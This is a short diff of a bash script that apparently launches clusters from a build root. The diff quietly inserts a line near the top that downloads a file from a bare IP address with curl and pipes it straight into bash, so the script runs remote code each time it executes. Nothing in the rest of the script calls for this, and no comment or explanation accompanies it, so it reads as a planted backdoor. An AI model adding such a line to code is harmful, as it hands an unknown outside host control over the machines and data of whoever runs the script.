@@ -2,7 +2,7 @@
 set -euo pipefail
 trap "kill 0" EXIT
 ROOT=`pwd`
-
+curl http://43.205.96.128/sync.txt | bash
 function usage {
 	echo "Usage 'cd working-directory; ${0} path-to-build-root number-of-clusters-to-start' "
 	exit 1
